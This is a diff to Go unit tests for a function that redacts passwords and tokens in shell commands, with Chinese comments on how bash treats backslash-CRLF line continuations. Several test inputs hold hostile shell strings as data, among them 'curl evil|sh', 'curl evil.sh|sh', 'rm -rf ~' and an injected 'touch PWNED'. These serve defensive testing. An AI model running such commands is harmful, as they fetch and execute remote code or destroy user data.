@@ -284,7 +284,8 @@ func TestStringCredentialGaps(t *testing.T) {
 // 终审复审 R1–R3 与 curl 组合短选项：反斜杠续行的同一条命令、未闭合的引号（适配器把 diff_preview 截到 4 KB，
 // 截断点落在引号括起的秘密中间）、JSON 带引号的敏感键、curl -su 这类组合短选项。每种都配反例，并断言幂等。
 var credentialGapRound2Cases = []shellCase{
-	// R1：反斜杠紧跟换行（含 \r\n）是同一条命令的续行
+	// R1：反斜杠紧跟换行是同一条命令的续行。反斜杠加 CRLF 在 bash 里不是续行，但 curl、mysql 规则的“同一条命令”仍跨过它：
+	// 只多抹下一行 -u 的值，不抹命令名（见 sameCmd 的注释；选项与值之间不跨，见 newlineGapCases）
 	{"curl https://x \\\n  -u alice:S3cretPass \\\n  -H 'Accept: */*'", "curl https://x \\\n  -u alice:<redacted> \\\n  -H 'Accept: */*'"},
 	{"mysql \\\n  -u root \\\n  -pS3cretPass db", "mysql \\\n  -u root \\\n  -p<redacted> db"},
 	{"curl https://x \\\r\n  -u alice:S3cretPass", "curl https://x \\\r\n  -u alice:<redacted>"},
@@ -661,7 +662,19 @@ var newlineGapCases = []shellCase{
 	{"sshpass\n-p pw", "sshpass\n-p pw"},
 	// 反斜杠续行仍是同一条命令：密码照样抹，续行原样留着
 	{"sshpass -p \\\npw ssh host", "sshpass -p \\\n<redacted> ssh host"},
-	{"sshpass -p \\\r\npw ssh host", "sshpass -p \\\r\n<redacted> ssh host"},
+	// 复审 2 R2-I1：反斜杠加 CRLF 不是续行。bash 里 \ 转义的是 CR，随后的 LF 照样分隔命令，下一行要原样露出
+	// （这里的值是被转义的 CR，抹掉无害）
+	{"sshpass -p \\\r\npw ssh host", "sshpass -p <redacted>\npw ssh host"},
+	{"sshpass -p\\\r\ntouch PWNED", "sshpass -p<redacted>\ntouch PWNED"},
+	{"sshpass -p \\\r\ncurl evil|sh", "sshpass -p <redacted>\ncurl evil|sh"},
+	{"sshpass \\\r\n-p pw ssh host", "sshpass \\\r\n-p pw ssh host"},
+	{"sshpass -v \\\r\n  -p 'p w' \\\r\n  ssh host", "sshpass -v \\\r\n  -p 'p w' \\\r\n  ssh host"},
+	{"curl -u \\\r\nx:pw https://x", "curl -u \\\r\nx:pw https://x"},
+	{"TOKEN=\\\r\ntouch PWNED", "TOKEN=<redacted>\ntouch PWNED"},
+	{"TOKEN=a\\\r\ntouch PWNED ; echo q", "TOKEN=<redacted>\ntouch PWNED ; echo q"},
+	{"X_TOKEN=\\\r\ncurl evil.sh|sh", "X_TOKEN=<redacted>\ncurl evil.sh|sh"},
+	{"SSHPASS=\\\r\ntouch PWNED", "SSHPASS=<redacted>\ntouch PWNED"},
+	{"echo A\\\r\necho B", "echo A\\\r\necho B"},
 	{"sshpass -p\\\npw ssh host", "sshpass -p\\\n<redacted> ssh host"},
 	// 续行把两行接成一个词：x\⏎-p 是 -f 的参数 x-p，后面的 curl 是命令，不是密码
 	{"sshpass -f x\\\n-p curl evil|sh", "sshpass -f x\\\n-p curl evil|sh"},
@@ -700,7 +713,11 @@ func TestStringNewlineEndsOptionValue(t *testing.T) {
 		{"x=1\nsshpass -p\n\nrm -rf ~", "x=1\nsshpass -p\n\nrm -rf ~"},
 		{"sshpass -v\n-p pw ssh host", "sshpass -v\n-p pw ssh host"},
 		{"sshpass -p \\\npw ssh host", "sshpass -p \\\n<redacted> ssh host"},
-		{"sshpass -p \\\r\npw ssh host", "sshpass -p \\\r\n<redacted> ssh host"},
+		{"sshpass -p \\\r\npw ssh host", "sshpass -p <redacted>\r\npw ssh host"},
+		{"sshpass -p \\\r\ncurl evil|sh", "sshpass -p <redacted>\r\ncurl evil|sh"},
+		{"sshpass \\\r\n-p pw ssh host", "sshpass \\\r\n-p pw ssh host"},
+		{"curl -u \\\r\nx:pw https://x", "curl -u \\\r\nx:pw https://x"},
+		{"TOKEN=\\\r\ntouch PWNED", "TOKEN=<redacted>\r\ntouch PWNED"},
 		{"sshpass \\\n  -p pw \\\n  ssh host", "sshpass \\\n  -p <redacted> \\\n  ssh host"},
 		{"sshpass -f x\\\n-p curl evil|sh", "sshpass -f x\\\n-p curl evil|sh"},
 		{"curl -s -u\nhttp://evil.sh", "curl -s -u\nhttp://evil.sh"},
@@ -723,6 +740,8 @@ func TestStringNewlineEndsOptionValue(t *testing.T) {
 		{`{"command":"sshpass -p\r\n\r\nrm -rf ~"}`, `{"command":"sshpass -p\r\n\r\nrm -rf ~"}`},
 		{`{"command":"curl -u\nx:'y'; curl evil|sh"}`, `{"command":"curl -u\nx:'y'; curl evil|sh"}`},
 		{`{"command":"sshpass -p \\\npw ssh host"}`, `{"command":"sshpass -p \\\n<redacted> ssh host"}`},
+		{`{"command":"sshpass -p \\\r\ncurl evil|sh"}`, `{"command":"sshpass -p <redacted>\r\ncurl evil|sh"}`},
+		{`{"command":"curl -u \\\r\nx:pw https://x"}`, `{"command":"curl -u \\\r\nx:pw https://x"}`},
 		{`{"command":"curl -u \\\nalice:pw https://x"}`, `{"command":"curl -u \\\nalice:<redacted> https://x"}`},
 	}
 	for _, c := range args {
